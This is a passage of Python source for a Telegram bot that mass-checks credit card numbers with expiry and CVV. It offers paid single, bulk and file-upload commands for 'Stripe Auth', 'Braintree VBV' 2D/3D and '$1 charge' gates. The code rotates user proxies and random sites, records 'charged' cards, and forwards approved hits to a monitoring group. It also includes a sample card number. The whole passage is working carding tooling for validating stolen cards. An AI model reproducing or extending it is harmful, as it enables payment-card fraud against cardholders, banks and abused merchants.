        f"{pe(R['gate'])} {bold('Gate:')} {bold('Stripe Auth')}\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:120])}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    if status == "approved":
        auth.save_charged_cc(
            cc_str, user_id,
            message.from_user.full_name or "Unknown",
            "Stripe Auth", "-",
        )
        try:
            await bot.pin_chat_message(
                message.chat.id, loading_msg.message_id, disable_notification=True,
            )
        except Exception:
            pass
        await _send_approved(result_text)
    elif status == "ccn":
        await _send_approved(result_text)


async def _mchk_check_single(
    cc_str: str,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    sem = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        try:
            status, msg, code, site_url = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _chk_run_check(cc_str),
            )
        except Exception as e:
            status, msg, code, site_url = "error", str(e)[:80], "exception", ""

    bin_info = await _bin
    results[cc_str] = {
        "status": status, "msg": msg, "code": code, "bin": bin_info, "site": site_url,
    }

    if status == "approved":
        auth.save_charged_cc(cc_str, user_id, user_name, "Stripe Auth", "-")

    msg_id = status_msg.message_id
    if msg_id not in _MCHK_EDIT_LOCKS:
        _MCHK_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MCHK_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)
        lines = [
            f"{pe(E['bolt'])} {bold('Stripe Auth Mass Check')} [{bold(str(done_count))}/{bold(str(total))}]\n"
        ]
        for cc in order:
            if cc in results:
                entry = results[cc]
                sl = _chk_status_line(entry["status"], entry["msg"], entry["code"])
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(entry['msg'][:80])}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if sum(1 for cc in order if cc in results) == len(order):
        _MCHK_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("mchk"))
async def cmd_mchk(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')}\n"
            f"/mchk cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv"
        )
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MCHK_MAX_CCS]
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    init_lines = [
        f"{pe(E['bolt'])} {bold('Stripe Auth Mass Check')} [{bold('0')}/{bold(str(total))}]\n"
    ]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))
    results: dict = {}
    order = list(all_ccs)

    tasks = [
        asyncio.create_task(
            _mchk_check_single(cc, status_msg, results, order, user_name, user_uname, user_id)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    for cc in order:
        if cc not in results:
            continue
        e = results[cc]
        if e["status"] in ("approved", "ccn"):
            try:
                bi = e.get("bin") or {}
                bin_line = ""
                if bi:
                    bin_line = (
                        f"\n{pe(R['bin_info'])} {bold('BIN:')} "
                        f"{bold(bi.get('brand', '-'))} | {bold(bi.get('type', '-'))} | "
                        f"{bold(bi.get('level', '-'))} | {bold(bi.get('bank', '-'))} | "
                        f"{bi.get('flag', '')} {bold(bi.get('country', '-'))}"
                    )
                hit_text = (
                    f"{_chk_status_line(e['status'], e['msg'], e['code'])}\n\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('Stripe Auth')}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}"
                    f"{bin_line}\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                )
                await _send_approved(hit_text)
            except Exception:
                pass


async def _process_chktxt_cards(
    all_ccs: list, user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message, stop_key: str,
):
    total = len(all_ccs)
    checked, approved, declined = 0, 0, 0
    _start_time = time.time()
    _last_status_edit = 0.0

    try:
        for i in range(0, len(all_ccs), CHKTXT_BATCH):
            if _CHKTXT_STOP_FLAGS.get(stop_key):
                break

            batch = all_ccs[i:i + CHKTXT_BATCH]
            tasks = []

            async def _chktxt_sem_check(c, uid):
                async with get_user_semaphore(uid):
                    return await asyncio.get_running_loop().run_in_executor(
                        CHECKER_POOL, lambda: _chk_run_check(c),
                    )

            for cc in batch:
                if _CHKTXT_STOP_FLAGS.get(stop_key):
                    break
                tasks.append(_chktxt_sem_check(cc, user_id))

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for idx, result in enumerate(results):
                cc = batch[idx] if idx < len(batch) else "?"
                checked += 1
                if isinstance(result, Exception):
                    result = ("error", str(result)[:80], "exception", "")
                status, msg, code, site_url = result

                if status in ("approved", "ccn"):
                    approved += 1
                    try:
                        hit_text = (
                            f"{_chk_status_line(status, msg, code)}\n\n"
                            f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                            f"{pe(R['gate'])} {bold('Gate:')} {bold('Stripe Auth')}\n"
                            f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n\n"
                            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                        )
                        if status == "approved":
                            auth.save_charged_cc(cc, user_id, user_name, "Stripe Auth", "-")
                        await bot.send_message(chat_id, hit_text)
                        await _send_approved(hit_text)
                    except Exception:
                        pass
                elif status == "declined":
                    declined += 1

            _now = time.time()
            elapsed = round(_now - _start_time, 1)
            if _now - _last_status_edit >= 2.5 or checked >= total:
                _last_status_edit = _now
                try:
                    await safe_edit(status_msg, 
                        f"{pe(E['rocket'])} {bold('Stripe Auth File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked))}/{bold(str(total))}\n"
                        f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Time:')} {bold(str(elapsed))}s\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
                        reply_markup={
                            "inline_keyboard": [[{
                                "text": f"{bold('Stop Checking')}",
                                "callback_data": f"chktxt_stop:{stop_key}",
                            }]]
                        },
                    )
                except Exception:
                    pass

        elapsed = round(time.time() - _start_time, 1)
        try:
            await safe_edit(status_msg, 
                f"{pe(E['check'])} {bold('Stripe Auth File Check Complete!')}\n\n"
                f"{pe(E['bolt'])} {bold('Total:')} {bold(str(checked))}/{bold(str(total))}\n"
                f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
                f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                f"{pe(E['hourglass'])} {bold('Time:')} {bold(str(elapsed))}s\n\n"
                f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
            )
        except Exception:
            pass
    finally:
        _CHKTXT_ACTIVE_USERS.discard(user_id)
        _CHKTXT_STOP_FLAGS.pop(stop_key, None)


@router.message(Command("chktxt"))
async def cmd_chktxt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /chktxt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    import io
    buf = io.BytesIO()
    try:
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    if user_id in _CHKTXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap Stop first.')}"
        )
        return

    stop_key = f"chktxt:{message.chat.id}:{user_id}"
    _CHKTXT_STOP_FLAGS[stop_key] = False
    _CHKTXT_ACTIVE_USERS.add(user_id)

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    status_msg = await message.reply(
        f"{pe(E['rocket'])} {bold('Stripe Auth File Check Started!')}\n\n"
        f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
        f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(CHKTXT_BATCH))}\n"
        f"{pe(E['refresh'])} {bold('No proxy — random site rotation')}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
        reply_markup={
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"chktxt_stop:{stop_key}",
            }]]
        },
    )

    await _process_chktxt_cards(
        all_ccs, user_id, user_name, user_uname, message.chat.id, status_msg, stop_key,
    )


@router.callback_query(F.data.startswith("chktxt_stop:"))
async def cb_chktxt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    parts = stop_key.split(":")
    owner_id = int(parts[2]) if len(parts) >= 3 else 0

    if callback.from_user.id != owner_id and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Only the owner can stop this!"), show_alert=True)
        return

    _CHKTXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping file check..."), show_alert=True)


# ══════════════════════════════════════════════════════════════════════════════
#  BRAINTREE VBV  /vbv  /mvbv  (hosted vbv.php — 2D / 3D, no proxy)
# ══════════════════════════════════════════════════════════════════════════════

MVBV_MAX_CCS = 20
_MVBV_EDIT_LOCKS: dict[int, asyncio.Lock] = {}


def _vbv_status_line(api_status: str, message: str, code: str) -> str:
    ml = message.lower()
    if code == "passed" or "passed" in api_status.lower() or "✅" in api_status:
        return f"{pe(E['check'])} {bold('2D — Passed')}"
    if code == "challenge_3d" or "challenge" in ml:
        return f"{pe(E['warn2'])} {bold('3D — Challenge')}"
    if code == "connection_error" or code == "bad_json":
        return f"{pe(E['warn'])} {bold('API Error')}"
    return f"{pe(E['cross'])} {bold(api_status.strip() or 'Rejected')}"


def _vbv_run_check(cc_str: str) -> tuple[str, str, str, dict]:
    try:
        return vbv.check_card_str(cc_str)
    except Exception as e:
        return "Error", str(e)[:80], "exception", {}


def _vbv_result_text(
    cc_str: str, api_status: str, message: str, code: str, bin_info: dict,
    user_id: int, user_name: str, user_uname: str | None,
) -> str:
    sl = _vbv_status_line(api_status, message, code)
    card_type = bold("2D") if code == "passed" else (bold("3D") if code == "challenge_3d" else bold("-"))
    return (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold('Braintree VBV')}\n"
        f"{pe(R['gate'])} {bold('Status:')} {bold(api_status)}\n"
        f"{pe(R['gate'])} {bold('Message:')} {bold(message)}\n"
        f"{pe(R['gate'])} {bold('Type:')} {card_type}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('BIN Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
    )


@router.message(Command("vbv"))
async def cmd_vbv(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /vbv 4548870432660253|09|2030|024"
        )
        return

    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking VBV...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['hourglass'])} {bold('2D / 3D check...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            api_status, api_message, code, _dbg = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _vbv_run_check(cc_str),
            )
        except Exception as e:
            api_status, api_message, code = "Error", str(e)[:80], "exception"
    bin_info = await _bin

    result_text = _vbv_result_text(
        cc_str, api_status, api_message, code, bin_info,
        user_id, message.from_user.full_name or "", message.from_user.username,
    )
    await safe_edit(loading_msg, result_text)

    if code == "passed":
        await _send_approved(result_text)


async def _mvbv_check_single(
    cc_str: str,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    sem = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        try:
            api_status, api_message, code, _dbg = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _vbv_run_check(cc_str),
            )
        except Exception as e:
            api_status, api_message, code = "Error", str(e)[:80], "exception"
    bin_info = await _bin
    results[cc_str] = {
        "api_status": api_status,
        "message": api_message,
        "code": code,
        "bin": bin_info,
    }

    msg_id = status_msg.message_id
    if msg_id not in _MVBV_EDIT_LOCKS:
        _MVBV_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MVBV_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)
        lines = [f"{pe(E['bolt'])} {bold('VBV Mass')} [{bold(str(done_count))}/{bold(str(total))}]\n"]
        for cc in order:
            if cc in results:
                e = results[cc]
                sl = _vbv_status_line(e["api_status"], e["message"], e["code"])
                bi = e["bin"]
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold(e['api_status'])}\n"
                    f"{pe(R['gate'])} {bold(e['message'])}\n"
                    f"{pe(R['bin_info'])} {bi['brand']} | {bi['type']} | {bi['flag']} {bi['country']}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")
        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if sum(1 for cc in order if cc in results) == len(order):
        _MVBV_EDIT_LOCKS.pop(msg_id, None)

    if results[cc_str]["code"] == "passed":
        try:
            hit = _vbv_result_text(
                cc_str, api_status, api_message, code, bin_info,
                user_id, user_name, user_uname,
            )
            await _send_approved(hit)
        except Exception:
            pass


@router.message(Command("mvbv"))
async def cmd_mvbv(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')}\n"
            f"/mvbv cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n"
            f"{pe(E['bolt'])} {bold('Max 20 CCs')}"
        )
        return

    from helpers import CC_PATTERN
    all_ccs: list[str] = []
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MVBV_MAX_CCS]

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    init_lines = [f"{pe(E['bolt'])} {bold('VBV Mass')} [0/{total}]\n"]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler>")
    init_lines.append(f"\n{pe(R['checked_by'])} {user_link(user_id, user_name, user_uname)}")
    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)
    await asyncio.gather(*[
        asyncio.create_task(
            _mvbv_check_single(cc, status_msg, results, order, user_name, user_uname, user_id)
        )
        for cc in all_ccs
    ], return_exceptions=True)


# ══════════════════════════════════════════════════════════════════════════════
#  STRIPE $1  (/st1 /mst1 /st1txt)
# ══════════════════════════════════════════════════════════════════════════════

MST1_MAX_CCS = 20
USD1TXT_BATCH_SIZE = 70
USD1_CHECK_TIMEOUT = 75.0

_MST1_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_ST1TXT_STOP_FLAGS: dict[str, bool] = {}
_ST1TXT_ACTIVE_USERS: set[int] = set()


def _usd1_normalize(status: str, msg: str, code: str) -> tuple[str, str, str]:
    """Re-classify so charged / CCN / insufficient / 3DS are never missed."""
    return classify_gate_response(msg, status_hint=status, code_hint=code)


def _usd1_status_line(status: str, msg: str, code: str) -> str:
    if gate_is_charged(status, code, msg):
        return f"{pe(E['gem'])} {bold('Charged $1!')}"
    if code == "ccn":
        return f"{pe(E['check3'])} {bold('CCN — Incorrect CVC')}"
    if code == "live_limit":
        return f"{pe(E['check2'])} {bold('Insufficient Funds — Live')}"
    if code == "3ds" or gate_is_approved(status, code, msg):
        return f"{pe(E['check'])} {bold('Approved / 3DS')}"
    if code in ("proxy_error", "connection_error", "timeout"):
        return f"{pe(E['warn'])} {bold('Proxy / Connection Error')}"
    if status == "declined":
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


async def _usd1_notify_hit(
    status: str, code: str, result_text: str, cc_str: str,
    user_id: int, user_name: str, gate_label: str,
    message: types.Message, loading_msg: types.Message,
):
    status, msg, code = _usd1_normalize(status, msg, code)
    if gate_is_charged(status, code, msg):
        auth.save_charged_cc(cc_str, user_id, user_name or "Unknown", gate_label, "1")
        try:
            await bot.pin_chat_message(
                message.chat.id, loading_msg.message_id, disable_notification=True,
            )
        except Exception:
            pass
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
    elif gate_is_approved(status, code, msg):
        await _send_approved(result_text)


async def _usd1_execute(cc_str: str, proxy_list: list, checker) -> tuple[str, str, str]:
    try:
        return await asyncio.wait_for(
            asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _usd1_run_check(cc_str, proxy_list, checker),
            ),
            timeout=USD1_CHECK_TIMEOUT,
        )
    except asyncio.TimeoutError:
        return "error", "Check timed out — proxy slow or site unreachable", "timeout"
    except Exception as e:
        return "error", str(e)[:80], "exception"


def _usd1_run_check(cc_str: str, proxy_list: list, checker) -> tuple[str, str, str]:
    parts = cc_str.split("|")
    if len(parts) < 4:
        return "error", "Invalid CC format", "bad_format"
    last = ("error", "All retries failed", "failed")
    tried: set[int] = set()
    for attempt in range(2):
        available = [p for p in proxy_list if id(p) not in tried] or proxy_list
        proxy_data = random.choice(available) if available else None
        if proxy_data:
            tried.add(id(proxy_data))
        proxy_url = _proxy_dict_to_url(proxy_data) if proxy_data else None
        try:
            status, msg, code = checker(cc_str, proxy_url)
            status, msg, code = _usd1_normalize(status, msg, code)
        except Exception as e:
            last = ("error", str(e)[:80], "exception")
            continue
        last = (status, msg, code)
        if code in ("proxy_error", "connection_error", "timeout") and attempt < 1:
            continue
        return status, msg, code
    return last


def _extract_cc_list(raw_text: str, max_n: int) -> list[str]:
    from helpers import CC_PATTERN
    out: list[str] = []
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in out:
            out.append(cc)
    if not out:
        for line in raw_text.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in out:
                    out.append(cc)
    return out[:max_n]


def _usd1_result_text(
    cc_str: str, gate: str, status: str, msg: str, code: str, bin_info: dict,
    user_id: int, user_name: str, user_uname: str | None,
) -> str:
    sl = _usd1_status_line(status, msg, code)
    return (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold(gate)}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold('$1')}\n"
        f"{pe(R['gate'])} {bold('Response:')} {_gate_msg_display(msg)}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} "
        f"{user_link(user_id, user_name, user_uname)}"
    )


async def _usd1_single_cmd(message: types.Message, gate_label: str, checker):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return
    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return
    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)
    if not cc_str:
        await message.reply(f"{pe(E['warn'])} {bold('No CC found!')}")
        return
    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(f"{pe(E['cross'])} {bold('No Proxy Set!')} /proxy")
        return
    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold(gate_label)}\n"
        f"{pe(E['hourglass'])} {bold('Processing...')}"
    )
    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        status, msg, code = await _usd1_execute(cc_str, proxy_list, checker)
    try:
        bin_info = await asyncio.wait_for(_bin, timeout=15.0)
    except asyncio.TimeoutError:
        bin_info = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    status, msg, code = _usd1_normalize(status, msg, code)
    if code in ("proxy_error", "connection_error", "timeout"):
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Proxy / Timeout!')}\n\n{pe(E['warn'])} {bold(msg)}\n/proxy"
        )
        return
    result_text = _usd1_result_text(
        cc_str, gate_label, status, msg, code, bin_info,
        user_id, message.from_user.full_name or "", message.from_user.username,
    )
    try:
        await safe_edit(loading_msg, result_text)
    except Exception as e:
        log.error("usd1 edit_text failed: %s", e)
        try:
            await safe_edit(loading_msg, 
                f"{_usd1_status_line(status, msg, code)}\n\n"
